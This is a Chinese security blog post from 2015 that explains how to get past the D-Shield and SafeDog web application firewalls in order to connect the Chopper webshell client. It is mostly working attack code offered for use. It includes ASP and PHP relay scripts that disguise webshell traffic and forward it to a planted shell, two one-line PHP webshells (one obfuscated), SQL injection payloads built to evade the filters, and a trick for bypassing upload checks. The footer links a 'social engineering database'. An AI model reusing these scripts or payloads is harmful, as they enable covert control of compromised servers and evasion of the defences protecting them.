<!DOCTYPE HTML><html><head><meta charset="utf-8"><title>绕过D盾安全狗连接菜刀思路 | 安全天使&#39;Blog</title><meta name="author" content="Angel"><meta name="description" content="若何绕过D盾、安全狗连接菜刀"><meta name="keywords" content="绕过,D盾,安全狗,菜刀"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta property="og:title" content="绕过D盾安全狗连接菜刀思路"/><meta property="og:site_name" content="安全天使&#39;Blog"/><meta property="og:image" content="undefined"/><link rel="alternative" href="/atom.xml" title="安全天使&#39;Blog" type="application/atom+xml"><link href="/favicon.jpg" rel="icon"><link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet"><link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css"><link rel="stylesheet" href="/css/style.css" media="screen" type="text/css"><link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css"><link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css"><link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css"><link rel="stylesheet" href="/css/sidenav.css" media="screen" type="text/css"><script type="text/javascript" src="http://lib.sinaapp.com/js/jquery/1.8/jquery.min.js"></script><script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script></head><body id="body" data-spy="scroll" data-target=".toc"><div class="container" id="container">	<div class="content">	<div class="page-header"><h1><a class="brand" href="/">Go Back</a><span class="split"></span><span class="title">绕过D盾安全狗连接菜刀思路</h1></div><span class="date" id="title-date"><strong><i class="fa fa-clock-o"></i>10月 10 2015</strong></span>		<div class="row page">  		<div class="col-md-12">		<h2 id="0x00_各种奇葩符号">0x00 各种奇葩符号</h2>
<p>  现在基本上没啥用了，毕竟几年前的小玩意儿</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/;.xxx.asp;.jpg</div><div class="line">/;00.asp/00.jpg</div></pre></td></tr></table></figure>


<p>像这种各位看官可以忽略了，毕竟某狗和某盾也不是吃干饭的，写出来只是为了纪念一下</p>
<h2 id="0x02##_中转(1)，抓菜刀连接webshell的包_然后研究安全狗过滤了哪些关键字_中转替换掉那些过滤的关键字">0x02##  中转(1)，抓菜刀连接webshell的包 然后研究安全狗过滤了哪些关键字 中转替换掉那些过滤的关键字</h2>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">&lt;%</div><div class="line">JmStr=Replace(Request.Form,"$_POST","$_REQUEST")</div><div class="line">JmStr=Replace(JmStr,"-&gt;|","--&gt;|")</div><div class="line">JmStr=Replace(JmStr,"@eval(","@eval   (")</div><div class="line">JmStr=Replace(JmStr,"System.Convert.FromBase64String","System.Convert. FromBase64String")</div><div class="line">JMUrl=request("dz")</div><div class="line">response.write  request("dz")</div><div class="line">JmRef=JMUrl</div><div class="line">JmCok=""</div><div class="line">response.write  PostData(JMUrl,JmStr,JmCok,JmRef)</div><div class="line">Function PostData(PostUrl,PostStr,PostCok,PostRef)</div><div class="line">Dim Http</div><div class="line">Set Http = Server.CreateObject("msxml2.serverXMLHTTP")</div><div class="line">With Http</div><div class="line">.Open "POST",PostUrl,False</div><div class="line">.SetRequestHeader "Content-Length",Len(PostStr)</div><div class="line">.SetRequestHeader "Content-Type","application/x-www-form-urlencoded"</div><div class="line">.SetRequestHeader "Referer",PostRef</div><div class="line">'.SetRequestHeader "Cookie",PostCok</div><div class="line">.Send PostStr</div><div class="line">PostData = .ResponseBody</div><div class="line">End With</div><div class="line">Set Http = Nothing</div><div class="line">PostData =bytes2BSTR(PostData)</div><div class="line">End Function</div><div class="line"></div><div class="line">Function bytes2BSTR(vIn)</div><div class="line">Dim strReturn</div><div class="line">Dim I, ThisCharCode, NextCharCode</div><div class="line">strReturn = ""</div><div class="line">For I = 1 To LenB(vIn)</div><div class="line">ThisCharCode = AscB(MidB(vIn, I, 1))</div><div class="line">If ThisCharCode &lt; &H80 Then</div><div class="line">strReturn = strReturn & Chr(ThisCharCode)</div><div class="line">Else</div><div class="line">NextCharCode = AscB(MidB(vIn, I + 1, 1))</div><div class="line">strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode))</div><div class="line">I = I + 1</div><div class="line">End If</div><div class="line">Next</div><div class="line">bytes2BSTR = strReturn</div><div class="line">End Function</div><div class="line"></div><div class="line">Function URLEncoding(vstrin)</div><div class="line">strReturn=""</div><div class="line">Dim i</div><div class="line">For i=1 To Len(vstrin)</div><div class="line">ThisChr=Mid(vstrin,i,1)</div><div class="line">if Abs(Asc(ThisChr))&lt; &HFF Then</div><div class="line">strReturn=strReturn & ThisChr</div><div class="line">Else</div><div class="line">InnerCode=Asc(ThisChr)</div><div class="line">If InnerCode&lt;0 Then</div><div class="line">InnerCode=InnerCode + &H10000</div><div class="line">End If</div><div class="line">Hight1=(InnerCode And &HFF00) \&HFF</div><div class="line">Low1=InnerCode And &HFF</div><div class="line">strReturn=strReturn & "%" & Hex(Hight1) & "%" & Hex(Low1)</div><div class="line">End if</div><div class="line">Next</div><div class="line">strReturn=Replace(strReturn,chr(32),"%20") '转换空格,如果网站过滤了空格,尝试用/**/来代替%20</div><div class="line">strReturn=Replace(strReturn,chr(43),"%2B")  'JMDCW增加转换+字符</div><div class="line">'strReturn=Replace(strReturn,过滤字符,"转换为字符")  '在此增加要过滤的代码</div><div class="line">URLEncoding=strReturn</div><div class="line">End Function</div><div class="line">%&gt;</div></pre></td></tr></table></figure>

<p>用法：<br>1.将这个脚本拿到可执行的.asp目录<br>2.访问<a href="http://demo.com/demo.asp?dz=&quot;要过的shell地址" target="_blank" rel="external">http://demo.com/demo.asp?dz=&quot;要过的shell地址</a>“<br>3.把地址输入菜刀，密码就是你设置的shell密码，类型还选一句话后缀<br>例如：<a href="http://www.xx.com/asf.asp?dz=http://xxx.com/yijuhua.php" target="_blank" rel="external">http://www.xx.com/asf.asp?dz=http://xxx.com/yijuhua.php</a> 密码<br>4.这个脚本暂时支持.php .aspx的一句话连接  .asp的不能用</p>
<h2 id="0x02##_中转(2)_若果上面脚本失效，可以使用这个">0x02## 中转(2) 若果上面脚本失效，可以使用这个</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line"><span class="variable">$webshell</span>=<span class="string">"http://www.phpinfo.me/plus/helen.php"</span>;<span class="comment">//把这里改成你的shell地址</span></div><div class="line"><span class="variable">$webshell</span>=<span class="variable">$webshell</span>.<span class="string">"?&1141056911=base64_decode"</span>;</div><div class="line"><span class="variable">$da</span>=<span class="variable">$_POST</span>;</div><div class="line"><span class="variable">$data</span> = <span class="variable">$da</span>;</div><div class="line">@<span class="variable">$data</span>=str_replace(<span class="string">"base64_decode("</span>,<span class="string">'$_GET[1141056911]('</span>,<span class="variable">$data</span>); <span class="comment">//接收菜刀的post，并把base64_decode替换成$_GET[1141056911](</span></div><div class="line"> <span class="comment">//print_r($data);</span></div><div class="line"><span class="variable">$data</span> = http_build_query(<span class="variable">$data</span>);  </div><div class="line"><span class="variable">$opts</span> = <span class="keyword">array</span> (  </div><div class="line"><span class="string">'http'</span> =&gt; <span class="keyword">array</span> (  </div><div class="line"><span class="string">'method'</span> =&gt; <span class="string">'POST'</span>,  </div><div class="line"><span class="string">'header'</span>=&gt; <span class="string">"Content-type: application/x-www-form-urlencoded\r\n"</span> .  </div><div class="line"><span class="string">"Content-Length: "</span> . strlen(<span class="variable">$data</span>) . <span class="string">"\r\n"</span>,  </div><div class="line"><span class="string">'content'</span> =&gt; <span class="variable">$data</span>)</div><div class="line">);</div><div class="line"><span class="variable">$context</span> = stream_context_create(<span class="variable">$opts</span>);  </div><div class="line"><span class="variable">$html</span> = @file_get_contents(<span class="variable">$webshell</span>, <span class="keyword">false</span>, <span class="variable">$context</span>); <span class="comment">//发送post  </span></div><div class="line"><span class="keyword">echo</span> <span class="variable">$html</span>;  </div><div class="line"><span class="preprocessor">?&gt;</span></div></pre></td></tr></table></figure>

<p>小马的话你可以把这两个丢进去：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span> <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">'a'</span>];<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">'cmd'</span>]);<span class="preprocessor">?&gt;</span></div><div class="line"><span class="preprocessor">&lt;?php</span> <span class="variable">$x</span>=base64_decode(<span class="string">"YXNzZXJ0"</span>);<span class="variable">$x</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>]);<span class="preprocessor">?&gt;</span>;</div></pre></td></tr></table></figure>

<p>用法：<br>1.把$webshell改成你的webshell地址<br>2.把代码保存为1234.php放到你本地的php环境里 然后直接丢菜刀连接<br><img src="http://dn-wwweshell.qbox.me/caidao1.png" alt="菜刀"></p>
<h2 id="0x03##_伪装user-agent">0x03## 伪装user-agent</h2>
<p> 晚上工具有很多，你可以随便找一个用，firfox也是比较强大的，我用的是铁鹰兄的WAF绕过神器来做试验的，地址放在下面<br><img src="http://dn-wwweshell.qbox.me/tiey1.png" alt="waf绕过神器"></p>
<p>首先假设一个代理，ie设置之后，那么ie的流量就从这个端口过。<br>指定域名，也就是只正对目标站修改user-agent，减少工作量。<br>get改为post好像是过智创waf的吧。</p>
<h2 id="0x04##_复参数绕过">0x04## 复参数绕过</h2>
<p>比如一个请求是这样的</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /pen/news.php?id=1 union select user,password from mysql.user</div></pre></td></tr></table></figure>

<p>可以修改为</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /pen/news.php?id=1&id=union&id=select&id=user,password&id=from%20mysql.user</div></pre></td></tr></table></figure>

<p>很多WAF都可以这样绕，目前安全狗的话可以绕过一丢丢语句</p>
<h2 id="0x05##_番外篇_SQL注入绕过">0x05## 番外篇 SQL注入绕过</h2>
<p>  ok，首先来一发demo存在SQL注入漏洞的php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?</span></div><div class="line"><span class="variable">$uid</span> = <span class="variable">$_REQUEST</span>[<span class="string">'id'</span>];</div><div class="line"><span class="keyword">if</span>(!<span class="variable">$conn</span> = @mysql_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"123456"</span>))</div><div class="line"><span class="keyword">die</span>(<span class="string">'&lt;font size=+1&gt;An Error Occured&lt;/font&gt;&lt;hr&gt;unable to connect to the database.'</span>);</div><div class="line"><span class="keyword">if</span>(!@mysql_select_db(<span class="string">"supe"</span>,<span class="variable">$conn</span>))</div><div class="line"><span class="keyword">die</span>(<span class="string">"&lt;font size=+1&gt;An Error Occured&lt;/font&gt;&lt;hr&gt;unable to find it at database on your MySQL server."</span>);</div><div class="line"><span class="variable">$text</span> = <span class="string">"select * from supe_members where uid="</span>.<span class="variable">$uid</span>;</div><div class="line"><span class="variable">$rs</span> = mysql_query (<span class="variable">$text</span>,<span class="variable">$conn</span>);</div><div class="line"><span class="keyword">while</span>(<span class="variable">$rom</span> = mysql_fetch_array(<span class="variable">$rs</span>))</div><div class="line">{</div><div class="line">    <span class="keyword">echo</span> <span class="variable">$rom</span>[<span class="string">"username"</span>];</div><div class="line">}</div><div class="line"><span class="preprocessor">?&gt;</span></div></pre></td></tr></table></figure>

<p>因为用的是supesite的库，可以看到这里是有明显SQL注入漏洞的，当没有安全狗的时候可以成功注入：<br><img src="http://dn-wwweshell.qbox.me/sql0x1.png" alt="SQL注入"></p>
<p>测试发现，安全狗这块的匹配正则应该是\s+and这类的，所以只要想办法去掉空格，用普通注释/<em>*/是不行的，安全狗也防了这块。但是对内联注释/</em>!and*/这种不知道为什么安全狗没有拦截。<br>我用下面的语句居然成功绕过SQL注入过滤：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.200.115/inj.php?id=1/*!and*/1=2/*!union*//*!select*/1,2,version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17</div></pre></td></tr></table></figure>

<h2 id="0x05##_番外篇_上传绕过">0x05## 番外篇 上传绕过</h2>
<p> 我们通过burp把上传的HTTP包抓下来，然后自己进行一下修改POST数据。经过了一些实验，直接说结果吧，当增加一处文件名和内容，让两个文件名不一致的时候，成功绕过了安全狗的防护，上传了php文件。原因是安全狗进行文件名匹配时候用的是第一个文件名test.jpg，是复合安全要求的，但是webserver在保存文件的时候却保存了第二个文件名test.php，也就是if(security_check(a)){do(b);}，导致安全检查没有用</p>
<div class="bdsharebuttonbox"><a href="#" class="bds_more" data-cmd="more"></a><a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a><a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网"></a><a href="#" class="bds_bdhome" data-cmd="bdhome" title="分享到百度新首页"></a><a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a><a href="#" class="bds_mshare" data-cmd="mshare" title="分享到一键分享"></a><a href="#" class="bds_print" data-cmd="print" title="分享到打印"></a><a href="#" class="bds_copy" data-cmd="copy" title="分享到复制网址"></a></div>&nbsp;<div class="tucao">❐ 热评文章：<br /><div class="ds-top-threads" data-range="monthly" data-num-items="8"></div><div class="urlid"> &nbsp;&nbsp;[ <a href="" target="_blank">绕过D盾安全狗连接菜刀思路</a> ]由Angel发表在 <a href="/">安全天使</a><br />&nbsp; [ 引用地址 ]：http://www.weshell.net/for-waf.html</div></div>
<div class="ds-thread" data-title="绕过D盾安全狗连接菜刀思路" data-url="http://www.weshell.net/for-waf.html"></div><script type="text/javascript">var duoshuoQuery = {short_name:"webshellhost"};(function() {    var ds = document.createElement('script');    ds.type = 'text/javascript';ds.async = true;    ds.src = 'http://static.duoshuo.com/embed.js';    ds.charset = 'UTF-8';    (document.getElementsByTagName('head')[0]    || document.getElementsByTagName('body')[0]).appendChild(ds);})();</script>
	</div></div><div class="container-narrow">	<footer>
<script>var _hmt = _hmt || [];(function() {  var hm = document.createElement("script");  hm.src = "//hm.baidu.com/hm.js?248313087381630ea1a3caba0e789997";  var s = document.getElementsByTagName("script")[0];   s.parentNode.insertBefore(hm, s);})();</script>
<SCRIPT language=javascript>function g(formname)	{var url = "http://www.baidu.com/baidu";if (formname.s[1].checked) {	formname.ct.value = "2097152";}else {	formname.ct.value = "0";}formname.action = url;return true;}</SCRIPT><center><form name="f1" onsubmit="return g(this)" target="_blank"><table bgcolor="#FFFFFF" style="font-size:9pt;"><tr height="60"><td valign="top"></td><td><input name=word size="35" maxlength="100" style="width: 210px;height: 24px;line-height: 24px;font: 14px arial;padding: 2px 5px;margin-right: 3px;border: 2px solid black;outline: 0;vertical-align: middle;margin-top:-27px;"><input type="submit" value="Scan" style="width: 66px;height: 24px;border: 0;color: #ccc;background: black;font-weight: bold;font: bold 14px arial;padding: 0;padding-top: 1px;margin-top:-27px;cursor: pointer;vertical-align: middle;"><br><input name=tn type=hidden value="bds"><input name=cl type=hidden value="3"><input name=ct type=hidden><input name=si type=hidden value="www.weshell.net"><input name=s type=radio style="display:none;"><input name=s type=radio checked style="display:none;"></td></tr></table></form>
<div class="weshell"><font size="0.4em"><strong>[ &copy; 2006-2013 <a href="http://www.weshell.net">安全天使&Angel</a> ] -  [<a href="http://www.miitbeian.gov.cn" target="_blank"> 鄂ICP备105632号-1</a> ] - [<a href="/atom.xml"> RSS源</a> - <a href="/baidusitemap.xml">引擎地图</a> - <a href="https://i0yy.com" target="_blank">自建社工库</a> ]</div>
<script language="javascript" type="text/javascript" src="http://quote.51.la/?id=17600924&amp;mb=3"></script></font></strong></center><div style="display:none"><script language="javascript" type="text/javascript" src="http://js.users.51.la/17600924.js"></script></div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>


</footer></div><a id="gotop" href="#"><span>▲</span></a><script src="/js/jquery.imagesloaded.min.js"></script><script src="/js/gallery.js"></script><script src="http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js"></script><script src="/js/jquery.tableofcontents.min.js"></script><script src="/js/tocgenerator.min.js"></script><script src="/js/main.js"></script><link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css"><script src="/fancybox/jquery.fancybox.pack.js"></script><script type="text/javascript">(function($){  $('.fancybox').fancybox();})(jQuery);</script></body></html>